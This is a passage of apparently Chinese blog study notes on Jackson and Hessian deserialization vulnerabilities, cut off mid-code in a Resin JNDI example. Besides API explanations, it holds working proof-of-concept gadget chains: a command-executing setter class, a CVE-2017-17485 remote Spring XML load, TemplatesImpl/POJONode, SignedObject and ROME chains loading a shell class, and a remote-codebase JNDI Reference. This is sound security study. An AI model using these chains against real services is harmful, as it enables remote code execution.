&lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; &lt;version&gt;2.9.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt; &lt;version&gt;2.9.3&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 二、序列化与反序列化ObjectMapperJackson最常用的API，可以从字符串、流或文件中解析JSON，并创建表示已解析的JSON的Java对象。序列化使用readValue，反序列化使用writeValue、writeValueAsString、writeValueAsBytes。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465 public static void json2objectObjectMapper(){ String jsondata = &quot;{\\&quot;name\\&quot;:\\&quot;xiaoming\\&quot;,\\&quot;age\\&quot;:1000}&quot;; ObjectMapper objectMapper = new ObjectMapper(); try { Person person = objectMapper.readValue(jsondata,Person.class); System.out.println(&quot;Name: &quot;+person.getName()+&quot;\\nAge: &quot;+person.getAge()); }catch (Exception e){ e.printStackTrace(); } } public static String object2jsonObjectMapper(){ Person person = new Person(); person.setName(&quot;xiaoming&quot;); person.setAge(16); ObjectMapper objectMapper = new ObjectMapper(); try { String json = objectMapper.writeValueAsString(person); return json; }catch (Exception e){ e.printStackTrace(); return &quot;error&quot;; } }package org.example;public class Person { private String name; private int age; private Object object; private int sex; public int getAge() { return age; } public int getSex() { return sex; } public Object getObject() { return object; } public String getName() { return name; } public void setObject(Object object) { this.object = object; } public void setName(String name) { this.name = name; } public void setSex(int sex) { this.sex = sex; } public void setAge(int age) { this.age = age; }} JsonPaserJsonParser的运行层级低于ObjectMapper，因此JsonParser比ObjectMapper更快，但使用起来也比较麻烦。 123456789101112131415161718192021222324252627282930313233343536373839404142public static void object2jsonJsonParser(){ String json = &quot;{\\&quot;name\\&quot;:\\&quot;xiaoming\\&quot;,\\&quot;age\\&quot;:123}&quot;; JsonFactory jsonFactory = new JsonFactory(); try { JsonParser parser = jsonFactory.createParser(json); System.out.println(parser); } catch (Exception e ){ e.printStackTrace(); } }public static void json2objectJsonParser(){ String json = &quot;{\\&quot;name\\&quot;:\\&quot;xiaoming\\&quot;,\\&quot;age\\&quot;:123}&quot;; JsonFactory jsonFactory = new JsonFactory(); Person1 person1 =new Person1(); try{ JsonParser parser = jsonFactory.createParser(json); while(!parser.isClosed()){ JsonToken jsonToken = parser.nextToken(); if (JsonToken.FIELD_NAME.equals(jsonToken)){ String fieldName = parser.getCurrentName(); System.out.println(fieldName); jsonToken=parser.nextToken(); if (&quot;name&quot;.equals(fieldName)){ person1.name = parser.getValueAsString(); } else if (&quot;age&quot;.equals(fieldName)){ person1.age = parser.getValueAsInt(); } } System.out.println(&quot;name: &quot;+person1.name); System.out.println(&quot;age: &quot;+person1.age); } } catch (Exception e ){ e.printStackTrace(); } } JsonGeneratorJsonGenerator用于将对象序列化成JSON或代码从中生成JSON的任何数据结构。 12345678910111213public static void object2jsonJsonGenerator(){ JsonFactory jsonFactory = new JsonFactory(); try{ JsonGenerator jsonGenerator = jsonFactory.createGenerator(new File(&quot;output.json&quot;), JsonEncoding.UTF8); jsonGenerator.writeStartObject(); jsonGenerator.writeStringField(&quot;name&quot;,&quot;test&quot;); jsonGenerator.writeNumberField(&quot;age&quot;,23); jsonGenerator.writeEndObject(); jsonGenerator.close(); }catch (Exception e){ e.printStackTrace(); } } 因为Java允许同一个接口使用不同的实例而执行不同的操作，所以Jackson也就提供了相对于的服务。在序列化过程中，可以将具体的子类信息绑定到序列化内容中，以便于在反序列化过程中，即是类成员不是具体类型而是Object接口或其他抽象类仍可以直接找到目标子类对象。这其实可以通过DefaultTyping 和 @JsonTypeInfo 注解来实现。 DefaultTypingDefaultTyping 是Jackson提供的enableDefaultTyping设置，其中包含四个值，其功能如下： DefaultTyping类型 能进行序列化和反序列化的属性 JAVA_LANG_OBJECT 属性的类型为Object OBJECT_AND_NON_CONCRETE 属性的类型为Object、Interface、AbstractClass NON_CONCRETE_AND_ARRAYS 属性的类型为Object、Interface、AbstractClass、Array NON_FINAL 所有除了声明为final之外的属性 用法示例： 12ObjectMapper objectMapper = new ObjectMapper();objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT); @JsonTypeInfo注解 注解类型 作用 抽象类属性能否反序列成功 JsonTypeInfo.Id.NONE 用于指定在序列化和反序列化过程中不包含任何类型标识、不使用识别码 × JsonTypeInfo.Id.CLASS 用于指定在序列化过程中指定具体的包名和类名 √ JsonTypeInfo.Id.MINIMAL_CLASS 用于指定在序列化过程中指定具体的包名和类名 √ JsonTypeInfo.Id.NAME 用于指定在序列化过程中指定具体的类名 × JsonTypeInfo.Id.CUSTOM 自定义识别码，需要用户自己实现，不能直接使用 × 反序列化流程但是具体是如何调用，其原理是什么，我们还需要从反序列的流程入手了解： 首先，readValue会调用_readMapAndClose方法进行处理，获取构造类需要用到的基本信息： 准备就绪之后调用BeanDeserializer中的deserialize函数： 首先会对输入数据的格式进行判断，根据是否是顶层类采用不同的反序列化方式： 符合条件之后调用vanillaDeserialize函数，先构造实例再进行赋值： createUsingDefault函数会调用指定类的无参构造函数来生成类实例： 调用_constructor.newInstance() 实现无参的构造函数： 调用Person类的无参构造函数完成了bean的实例化： 获取到Person类实例之后会根据类的属性与传入的json数据继续成员变量名称比对， 以键值对的形式进行匹配，符合的则进行赋值。 先是调用了deserialize函数进行解析，随后再利用setter进行赋值。 也就是说当满足前提条件的时候，Jackson反序列化会调用属性所属类的构造函数和setter方法，我们就可以在此做文章，属性中有Object则考虑构造函数和setter函数，没有则进考虑setter函数。 例如一个简单的例子： 1234567891011121314151617//恶意类public class Evil { public String cmd; public void setCmd(String cmd) { this.cmd = cmd; try { Runtime.getRuntime().exec(this.cmd); }catch (Exception e){ } }}//反序列化触发setter方法 public static void main(String[] args) throws Exception{ String json = &quot;{\\&quot;name\\&quot;:\\&quot;Evil\\&quot;,\\&quot;age\\&quot;:100,\\&quot;object\\&quot;:{\\&quot;@class\\&quot;:\\&quot;org.example.Evil\\&quot;,\\&quot;cmd\\&quot;:\\&quot;calc\\&quot;},\\&quot;sex\\&quot;:1}&quot;; ObjectMapper objectMapper1 = new ObjectMapper(); Person person1 = objectMapper1.readValue(json,Person.class); } 三、反序列化漏洞Jackson反序列化漏洞可分为两类，一是基于Jackson的反序列化机制，二是基于Jackson库中的某些类作为调用链中的某一段。 基于Jackson反序列化机制由前面我们可以看到，Jackson在反序列化的时候类似于Fastjson，通过某些设置使得可以在json数据中指定具体的类信息，实现对特定类的实例化从进行恶意类加载进行攻击，具体的前提条件如下（满足其中之一即可）： 调用了ObjectMapper.enableDefaultTyping()函数； 对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解； 对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解； CVE-2017-17485pom.xml 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;jackson1&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;7&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;7&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-beans --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-beans&lt;/artifactId&gt; &lt;version&gt;5.0.2.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-context --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;5.0.2.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-core --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-core&lt;/artifactId&gt; &lt;version&gt;5.0.2.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-expression --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-expression&lt;/artifactId&gt; &lt;version&gt;5.0.2.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-logging&lt;/groupId&gt; &lt;artifactId&gt;commons-logging&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-annotations --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt; &lt;version&gt;2.7.9&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; &lt;version&gt;2.7.9&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.7.9&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; poc 123456789101112131415161718package org.example;import com.fasterxml.jackson.databind.ObjectMapper;import java.io.IOException;public class CVE201717485 { public static void main(String[] args) { String payload = &quot;[\\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\\&quot;, \\&quot;http://127.0.0.1/spel.xml\\&quot;]&quot;; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); try { mapper.readValue(payload, Object.class); } catch (IOException e) { e.printStackTrace(); } }} spel.xml 123456789&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;constructor-arg value=&quot;calc.exe&quot; /&gt; &lt;property name=&quot;whatever&quot; value=&quot;#{ pb.start() }&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; POJONodeTemplatesImpl任意类加载POJONode类继承了BeanJsonNode抽象类，在调用POJONode的toString方法的时候实际上调用的是BeanJsonNode的toString: toString的内部调用的其实是InternalNodeMapper.nodeToString() 内部调用的其实就是Jackson的节点JSON序列化方法writeValueAsString，将对象序列化为JSON数据： 一路跟进最后是调用到了POJONode的serialize函数： 这里会对POJONode的成员进行序列化： 最后会在获取成员变量的值时调用getter也就是TemplatesImpl.getOutputProperties，也就到了我们最熟悉的环节。 因此，只要POJONode类的_value成员是我们设置好的TemplatesImpl类，那么在调用POJONode的toString的时候就能够触发任意类的加载。 12345678910111213141516171819202122232425262728import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import javax.xml.transform.Templates;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class POJONodeTest { public static void main(String[] args) throws Exception{ byte[] bytes = Files.readAllBytes(Paths.get(&quot;恶意类路径&quot;)); Templates templatesImpl = new TemplatesImpl(); setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]{bytes}); setFieldValue(templatesImpl, &quot;_name&quot;, &quot;aaa&quot;); setFieldValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl()); POJONode jsonNodes = new POJONode(templatesImpl); jsonNodes.toString(); } private static void setFieldValue(Object obj, String field, Object arg) throws Exception{ Field f = obj.getClass().getDeclaredField(field); f.setAccessible(true); f.set(obj, arg); }} 当然这只是一条完整反序列化漏洞调用链的后半段，还需要接上从readObject到toString的调用才行。 说到toString最先想到的肯定还是javax.management.BadAttributeValueExpException这个类，它在readObject过程中会获取val这一成员，如果val不是String类型且符合安全管理机制的话就会调用其toString函数，那么我们只需要把val这一成员的值设为带有TemplatesImpl``POJONode类就可以了，整一条链子也就实现了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960package org.example;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.*;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import javassist.CtMethod;public class PON { public static void main(String[] args)throws Exception { CtClass ctClass = ClassPool.getDefault().get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;); CtMethod writeReplace = ctClass.getDeclaredMethod(&quot;writeReplace&quot;); ctClass.removeMethod(writeReplace); ctClass.toClass(); byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:\\\\ctf_tools\\\\java_study\\\\rome\\\\shell.class&quot;)); Templates templatesImpl = new TemplatesImpl(); setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]{bytes}); setFieldValue(templatesImpl, &quot;_name&quot;, &quot;aaa&quot;); setFieldValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl()); POJONode jsonNodes = new POJONode(templatesImpl); BadAttributeValueExpException exp = new BadAttributeValueExpException(null); Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;); val.setAccessible(true); val.set(exp,jsonNodes); System.out.println(serial(exp)); deserial(serial(exp)); } public static String serial(Object o) throws Exception{ ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(o); oos.close(); String base64String = Base64.getEncoder().encodeToString(baos.toByteArray()); return base64String; } public static void deserial(String data) throws Exception { byte[] base64decodedBytes = Base64.getDecoder().decode(data); ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } private static void setFieldValue(Object obj, String field, Object arg) throws Exception{ Field f = obj.getClass().getDeclaredField(field); f.setAccessible(true); f.set(obj, arg); }} SignedObject二次反序列化由前面我们知道POJONode类的toString函数在调用过程中在获取成员变量的值时调用getter，回想起前面的ROME反序列化可以想到SignedObject类的getter方法getObject也能在这里被触发，实现二次反序列化，从而绕过Templates被禁用的情况，这里我们也是只需要为POJONode类的成员变量_value赋值为带有二次反序列化内容的SignedObject类即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149package org.example;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import org.apache.commons.collections4.functors.ConstantTransformer;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.math.BigInteger;import java.nio.file.Files;import java.nio.file.Paths;import java.security.*;import java.security.interfaces.DSAParams;import java.security.interfaces.DSAPrivateKey;import java.util.Base64;import java.util.HashMap;public class SignedObjectPON { public static void main(String[] args) throws Exception{ CtClass ctClass = ClassPool.getDefault().get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;); CtMethod writeReplace = ctClass.getDeclaredMethod(&quot;writeReplace&quot;); ctClass.removeMethod(writeReplace); ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:\\\\ctf_tools\\\\java_study\\\\rome\\\\shell.class&quot;)); setValue(templates,&quot;_name&quot;,&quot;aaa&quot;); setValue(templates,&quot;_bytecodes&quot;,new byte[][]{bytes}); setValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1)); EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean); HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(equalsBean,&quot;123&quot;); setValue(toStringBean,&quot;_obj&quot;,templates); SignedObject signedObject = makeSObj(hashMap); POJONode jsonNodes = new POJONode(signedObject); BadAttributeValueExpException exp = new BadAttributeValueExpException(null); Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;); val.setAccessible(true); val.set(exp,jsonNodes); System.out.println(serial(exp));// String exp = &quot;base编码的payload&quot;;// deserial(exp); } public static String serial(Object o) throws Exception{ ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(o); oos.close(); String base64String = Base64.getEncoder().encodeToString(baos.toByteArray()); return base64String; } public static void deserial(String data) throws Exception { byte[] base64decodedBytes = Base64.getDecoder().decode(data); ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } private static void setValue(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException { Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj,value); } public static SignedObject makeSObj(Serializable o) throws IOException, InvalidKeyException, SignatureException { return new SignedObject((Serializable) o, new DSAPrivateKey() { @Override public DSAParams getParams() { return null; } @Override public String getAlgorithm() { return null; } @Override public String getFormat() { return null; } @Override public byte[] getEncoded() { return new byte[0]; } @Override public BigInteger getX() { return null; } }, new Signature(&quot;1&quot;) { @Override protected void engineInitVerify(PublicKey publicKey) throws InvalidKeyException { } @Override protected void engineInitSign(PrivateKey privateKey) throws InvalidKeyException { } @Override protected void engineUpdate(byte b) throws SignatureException { } @Override protected void engineUpdate(byte[] b, int off, int len) throws SignatureException { } @Override protected byte[] engineSign() throws SignatureException { return new byte[0]; } @Override protected boolean engineVerify(byte[] sigBytes) throws SignatureException { return false; } @Override protected void engineSetParameter(String param, Object value) throws InvalidParameterException { } @Override protected Object engineGetParameter(String param) throws InvalidParameterException { return null; } } ); }} 参考链接： https://xz.aliyun.com/t/12966 https://www.cnblogs.com/LittleHann/p/17811918.html http://www.mi1k7ea.com/2019/11/17/Jackson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94CVE-2017-1748%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/ http://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/","link":"/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"Hessian反序列化","text":"前置知识 1、CC链 2、rome反序列化 Hessian是一种用于远程调用的二进制协议，广泛用于构建分布式系统中的跨平台通信。它可以将Java对象序列化为二进制数据，相对于json或xml提供更高效的数据传输和更低的开销。这里讲的Hessian 是CAUCHO公司的工程项目，为了达到或超过 ORMI/Java JNI 等其他跨语言/平台调用的能力设计而出，在 2004 点发布 1.0 规范。Hessian是基于Field机制来进行反序列化，通过一些特殊的方法或者反射来进行赋值，在反序列化过程中自动调用的方法更少，相对基于Bean机制其攻击面也更小。 反序列化过程我们可以编写一个简单的Person类来进行测试，调用Hessian的序列化方法转化为二进制数组，随后再调用Hessian的发序列化方法将二进制数组转化为Person对象，在此过程中下断点并进行单步跟进来观察其反序列化的过程。 项目依赖： 12345&lt;dependency&gt; &lt;groupId&gt;com.caucho&lt;/groupId&gt; &lt;artifactId&gt;hessian&lt;/artifactId&gt; &lt;version&gt;4.0.63&lt;/version&gt;&lt;/dependency&gt; Person.java 123456789101112131415161718192021222324package org.example;import java.io.Serializable;public class Person implements Serializable { public String name; public int age; public int getAge(){ return age; } public String getName(){ return name; } public void setAge(int age) { this.age = age; } public void setName(String name) { this.name = name; }} HessianTest.java 123456789101112131415161718192021package org.example;import com.caucho.hessian.io.HessianInput;import com.caucho.hessian.io.HessianOutput;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.Serializable;public class HessianTest implements Serializable { public static void main(String[] args) throws IOException{ Person xiaoming = new Person(); xiaoming.setAge(10); xiaoming.setName(&quot;xiaoming&quot;); byte[] s = serialize(xiaoming); System.out.println((Person)deserialize(s)); }} 在IDEA中，对 Object o = input.readObject();下断点，启动调试运行： 在readObject()当中调用read()来获取tag，随后根据tag的类型来进行分类处理： 跟进到read()中发现其读取的是字节数组的第一个元素值，这里是77ASCII对应的字母是M，因为Hessian的序列化总会把结果处理成一个Map，所以这里的tag总会是M。在case 'M'的情况下，先获取待反序列化对象的类型，之后再调用readMap()进行处理： 跟进到readMap()中，可以看到会先调用getDeserializer()来获取相应类型的deserializer，并调用其readMap()进行处理；如果获取不到，就会进入到_hashMapDeserializer.readMap中 在deserializer.readMap()中，会先实例化一个空对象，随后调用readMap()： 在readMap()中，会将obj加入引用中以便来寻找值，随后循环对值进行恢复，通过_fieldMap来获取相应的Deserializer，根据获取到的Deserializer进入相应的deserialize方法中。 进入deserialize方法后，会对键对应的值进行读取，这里读取的是字符串，所以对应的是readString()，之后对obj进行恢复赋值。 不同的类型的键会有不同的Deserializer，相应的就会有不同的deserialize方法，如果对应的键值是unsafe对象的话则会获取UnsafeDeserializer，在deserialize中就会调用readObject对in进行反序列化。 对于Map类型则会获取MapDeserializer，在deserialize中会调用如下的readMap()： 如果_type是Map则使用HashMap，SortedMap则使用TreeMap()，接着在while 循环中读取 key-value 的键值对并调用 put 方法，在put里面就会调用到putVal和hash了，到这里就可以接上我们熟悉的一些链子了，例如HashMap触发hashCode()、equals()，TreeMap触发compareTo()。 ROME前面一篇中详细介绍了ROME的反序列化漏洞调用的原理，最主要的逻辑就在于ToStringBean的toString中对于getter的循环调用，而诸如EqualsBean的类则能够触发它toString，触发EqualsBean的逻辑就在于HashMap在put的时候会做哈希从而调用到hashCode。那么如果放在Hessian反序列化中，就会自动触发HashMap的put，也就触发了ROME的任意类加载。 这里还可以使用SignedObject来避开不出网限制。 POC如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138package org.example;import com.caucho.hessian.io.HessianInput;import com.caucho.hessian.io.HessianOutput;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import org.apache.commons.collections4.functors.ConstantTransformer;import javax.xml.transform.Templates;import java.io.*;import java.math.BigInteger;import java.nio.file.Files;import java.nio.file.Paths;import java.lang.reflect.Field;import java.security.*;import java.security.interfaces.DSAParams;import java.security.interfaces.DSAPrivateKey;import java.util.HashMap;public class EqualsBeanTest { public static void main(String[] args) throws Exception { //二次反序列化的对象 TemplatesImpl templates = new TemplatesImpl(); byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:\\\\ctf_tools\\\\java_study\\\\rome\\\\shell.class&quot;)); setValue(templates,&quot;_name&quot;,&quot;aaa&quot;); setValue(templates,&quot;_bytecodes&quot;,new byte[][]{bytes}); setValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1)); EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean); HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(equalsBean,&quot;123&quot;); setValue(toStringBean,&quot;_obj&quot;,templates); //第一次反序列化的对象 SignedObject signedObject = makeSObj(hashMap); ToStringBean toStringBean1 = new ToStringBean(SignedObject.class,&quot;1&quot;); EqualsBean equalsBean1 = new EqualsBean(ToStringBean.class,toStringBean1); HashMap&lt;Object,Object&gt; hashMap1 = new HashMap&lt;&gt;(); hashMap1.put(equalsBean1,&quot;123&quot;); setValue(toStringBean1,&quot;_obj&quot;,signedObject); serialize(hashMap1); unserialize(&quot;ser1.bin&quot;); } public static SignedObject makeSObj(Serializable o) throws IOException, InvalidKeyException, SignatureException { return new SignedObject((Serializable) o, new DSAPrivateKey() { @Override public DSAParams getParams() { return null; } @Override public String getAlgorithm() { return null; } @Override public String getFormat() { return null; } @Override public byte[] getEncoded() { return new byte[0]; } @Override public BigInteger getX() { return null; } }, new Signature(&quot;1&quot;) { @Override protected void engineInitVerify(PublicKey publicKey) throws InvalidKeyException { } @Override protected void engineInitSign(PrivateKey privateKey) throws InvalidKeyException { } @Override protected void engineUpdate(byte b) throws SignatureException { } @Override protected void engineUpdate(byte[] b, int off, int len) throws SignatureException { } @Override protected byte[] engineSign() throws SignatureException { return new byte[0]; } @Override protected boolean engineVerify(byte[] sigBytes) throws SignatureException { return false; } @Override protected void engineSetParameter(String param, Object value) throws InvalidParameterException { } @Override protected Object engineGetParameter(String param) throws InvalidParameterException { return null; } } ); } private static void setValue(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException { Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj,value); } public static void serialize(Object obj) throws IOException { HessianOutput oos = new HessianOutput(new FileOutputStream(&quot;ser1.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException{ HessianInput ois = new HessianInput(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; }} ResinResin也是CAUCHO公司的产品，是一个非常流行的支持servlets 和jsp的引擎，速度非常快。它里面有一个类QNAME，用来表示一个解析的JNDI接口名称： 这里我们关注它的toString函数，通过for循环遍历当前对象包含的所有成员，随后进行相应的处理，首先会获取当前元素的值赋值给str，随后根据name是否为null进行不同的处理，如果name为null则直接把str赋值给name，否则调用了_context.composeName获取name，如果触发NamingException则会对name和str用斜杠进行拼接。 在ContinuationContext类的composeName实现中调用了getTargetContext，看起来有点远程类加载的意味。在getTargetContext中如果满足contCtx为null和cpe.getResolvedObj()返回不为null就可以调用NamingManager.getContext： 只要obj的不是Context类型就能够走到调用getObjectInstance()的地方。这里看一下getObjectInstance的注释： getObjectInstance是用来为指定的对象和环境创建对象的实例。如果 refInfo 是没有工厂类名的 Reference 或 Referenceable，并且地址是地址类型为“URL”的 StringRefAddrs，则尝试与每个 URL 的方案 id 对应的 URL 上下文工厂来创建对象。在方法的实现中，也是对refInfo进行了类型的判断，如果是Reference 或 Referenceable类型就会赋值给ref，从而在接下去的if判断中不为null，如果ref.getFactoryClassName()不为空就会调用到getObjectFactoryFromReference。 getObjectFactoryFromReference会先尝试直接通过factoryName加载类，找不到之后再通过ref.getFactoryClassLocation()获取codebase，调用helper.loadClass进行类加载： 如果开启trustURLCodebase，就会调用URLClassLoader.newInstanace()进行远程类加载，随后loadClass返回的cls会在前面的NamingManager#getObjectFactoryFromReference进行实例化。 这里可以先做一个测试： 123456789101112131415161718192021222324252627282930313233343536package org.example;import javax.naming.CannotProceedException;import javax.naming.Context;import javax.naming.Reference;import com.caucho.naming.QName;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.Hashtable;public class ResinTest { public static void main(String[] args) throws Exception { String refAddr = &quot;http://127.0.0.1:8000/&quot;; String refClassName = &quot;Evil&quot;; Reference ref = new Reference(refClassName,refClassName,refAddr); CannotProceedException cannotProceedException = new CannotProceedException(); setFiled(&quot;javax.naming.NamingException&quot;,cannotProceedException,&quot;resolvedObj&quot;,ref); Hashtable hashtable = new Hashtable(); Class&lt;?&gt; cla = Class.forName(&quot;javax.naming.spi.ContinuationContext&quot;); Constructor&lt;?&gt; constructor = cla.getDeclaredConstructor(CannotProceedException.class, Hashtable.class); constructor.setAccessible(true); Context continuationContext = (Context) constructor.newInstance(cannotProceedException,hashtable); QName qName = new QName(continuationContext,&quot;1&quot;,&quot;2&quot;); 